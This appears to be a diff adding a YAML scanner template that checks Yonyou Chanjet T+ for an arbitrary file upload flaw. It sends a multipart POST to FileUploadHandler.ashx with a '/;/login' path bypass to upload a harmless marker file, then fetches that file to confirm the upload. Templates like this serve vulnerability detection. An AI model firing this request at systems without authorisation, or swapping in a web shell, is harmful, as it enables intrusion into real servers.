@@ -1,0 +1,36 @@
+id:
+
+info:
+  name: 用友畅捷通TPlus FileUploadHandler.ashx任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login
+  headers:
+    User-Agent: Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)
+    Accept-Encoding: gzip, deflate
+    Accept: '*/*'
+    Connection: close
+    Content-Length: 185
+    Content-Type: multipart/form-data; boundary=f2d64c4e8d84d6f13811577027e9b102
+  data: |
+    --f2d64c4e8d84d6f13811577027e9b102
+    Content-Disposition: form-data; name="file"; filename="135325.txt"
+    Content-Type: image/jpeg
+
+    881455812769
+    --f2d64c4e8d84d6f13811577027e9b102--
+response1:
+  headers:
+  body:
+  code:
+requests2:
+  method: GET
+  path: /tplus/UserFiles/135325.txt
+response2:
+  headers:
+  body: 881455812769
+  code: 200
